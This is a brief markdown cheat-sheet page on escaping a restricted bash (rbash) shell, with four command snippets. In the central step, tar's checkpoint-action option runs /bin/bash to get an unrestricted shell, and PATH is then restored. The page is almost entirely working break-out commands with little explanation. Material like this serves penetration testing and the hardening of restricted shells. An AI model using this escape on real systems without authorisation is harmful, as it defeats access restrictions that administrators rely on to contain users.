---
title: "rbash"
date: 2024-7-9
tags: ["rbash", "shell", "escape", "bypass", "tar"]
---

---
### Abuse #1: tar to rbash Escape

<div>

```bash
# Before enter rbash
echo $PATH
```

```bash
# Enter rbash
su <USER> -
```

```bash
# rbash escape using tar
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

```bash
# Paste the above $PATH (e.g.)
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

</div>

<br>